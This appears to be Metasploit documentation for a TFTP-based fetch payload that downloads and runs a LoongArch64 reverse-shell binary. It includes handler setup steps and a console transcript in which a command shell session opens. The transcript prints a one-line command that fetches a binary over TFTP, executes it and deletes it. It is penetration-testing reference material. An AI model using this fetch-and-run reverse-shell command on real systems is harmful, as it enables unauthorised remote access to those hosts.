## Vulnerable Application

This adapter downloads a Linux LoongArch64 ELF over TFTP and executes it.
No vulnerable application is required; the generated command must run on a
Linux LoongArch64 system with TFTP installed.

## Verification Steps

1. Prepare a Linux LoongArch64 host with TFTP and `/bin/sh`.
1. Start `./msfconsole` and select `use exploit/multi/handler`.
1. Set `PAYLOAD` to `cmd/linux/tftp/loongarch64/shell_reverse_tcp`.
1. Set `LHOST`, `LPORT`, `FETCH_COMMAND` to `TFTP`, `FETCH_SRVPORT` to `69`, and `VERBOSE` to `true`.
1. Run the handler and execute the printed fetch command on the test host; the handler should open a command-shell session.
1. In the resulting shell, run `id` and `uname -a`; verify that they report the test host's identity and LoongArch64 architecture.

## Options

### FETCH_SRVPORT

When `FETCH_COMMAND` is `TFTP`, set this to `69` because common Linux TFTP
clients do not accept a custom server port. To bind the server elsewhere, set
`FetchListenerBindPort` and redirect incoming UDP port 69 traffic to it.

## Scenarios

```msf
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload cmd/linux/tftp/loongarch64/shell_reverse_tcp
payload => cmd/linux/tftp/loongarch64/shell_reverse_tcp
msf exploit(multi/handler) > set LHOST 10.5.135.210
LHOST => 10.5.135.210
msf exploit(multi/handler) > set LPORT 50108
LPORT => 50108
msf exploit(multi/handler) > set FETCH_COMMAND TFTP
FETCH_COMMAND => TFTP
msf exploit(multi/handler) > set FETCH_SRVHOST 10.5.135.210
FETCH_SRVHOST => 10.5.135.210
msf exploit(multi/handler) > set FETCH_SRVPORT 69
FETCH_SRVPORT => 69
msf exploit(multi/handler) > set FETCH_URIPATH pr21954tftp3
FETCH_URIPATH => pr21954tftp3
msf exploit(multi/handler) > set FETCH_DELETE true
FETCH_DELETE => true
msf exploit(multi/handler) > set VERBOSE true
VERBOSE => true
msf exploit(multi/handler) > run -j
[*] Command to execute on target: (echo binary ; echo get pr21954tftp3 ) | tftp 10.5.135.210; chmod +x ./pr21954tftp3; ./pr21954tftp3 &sleep 5;rm -rf ./pr21954tftp3;
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Starting TFTP server on 10.5.135.210:69
[*] Adding TFTP resource pr21954tftp3
[*] Started reverse TCP handler on 10.5.135.210:50108
msf exploit(multi/handler) > [*] Command shell session 1 opened (10.5.135.210:50108 -> 10.5.132.181:40040) at 2026-10-20 16:01:33 -0500
sessions -i 1
[*] Starting interaction with 1...

uid=1000(msfuser) gid=1000(msfuser) groups=1000(msfuser),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),110(netdev),114(bluetooth),116(scanner),117(lpadmin)
Linux morefinels64 4.19.0-19-loongson-3 #1 SMP 4.19.190.8.26 Wed Oct 15 02:40:20 UTC 2025 loongarch64 loongarch64 loongarch64 GNU/Linux
[*] 10.5.132.181 - Command shell session 1 closed.

```
